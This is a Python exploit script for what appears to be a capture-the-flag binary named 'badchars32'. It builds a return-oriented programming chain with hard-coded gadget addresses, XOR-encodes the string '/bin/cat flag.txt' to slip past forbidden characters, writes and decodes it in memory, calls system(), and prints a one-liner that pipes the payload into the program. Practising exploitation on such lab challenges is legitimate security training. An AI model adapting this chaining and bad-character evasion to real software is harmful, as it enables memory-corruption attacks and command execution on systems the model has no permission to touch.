import binascii
import random


def addr_conv(input):
    data = ""
    new_inp = hex(input)[2:].rjust(8, "0")
    for i in range(0, len(new_inp), 2):
        data = "\\x" + new_inp[i] + new_inp[i+1] + data
    return data

def convertor(input):
    data = ""
    for c in input:
        data += "\\x" + binascii.hexlify(c.encode()).decode()
    while len(data) < 16:
        data += "\\x00"
    return data


gadg_ppr = 0x08048899
data = 0x0804a038
system_call = 0x080484E0
gadg_xor = 0x08048890
gadg_writer = 0x08048893
gadg_ppr2 = 0x08048896
gadg_xor = 0x08048890
ret_addr = 0x08048699
exit_addr = 0x080484F0
string = "/bin/cat flag.txt"
badwords = ["b", "i", "c", "/", " ", "f", "n", "s", "\n"]
bad_locs = []
xor_byte = random.randint(1, 127)
def xorer(st):
    new_w = ""
    iter = 0
    for i in st:
        if i in badwords:
            if chr(ord(i) ^ xor_byte) in badwords:
                return False
            else:
                new_w += chr(ord(i) ^ xor_byte)
                bad_locs.append(iter)
        else:
            new_w += i
        iter += 1
    return new_w

s = xorer(string)
while not s:
    xor_byte += 1
    bad_locs = []
    s = xorer(string)

payload = ""
i = 0
while i < len(s):
    payload += addr_conv(gadg_ppr) + convertor(s[i:i+4]) + addr_conv(data+i) + addr_conv(gadg_writer)
    i += 4
for i in bad_locs:
    payload += addr_conv(gadg_ppr2) + addr_conv(data+i) + convertor(chr(xor_byte)) + addr_conv(gadg_xor)
payload += addr_conv(system_call) + addr_conv(exit_addr) + addr_conv(data)

print("python -c 'print \"A\"*44+\""+payload+"\"' | ./badchars32")
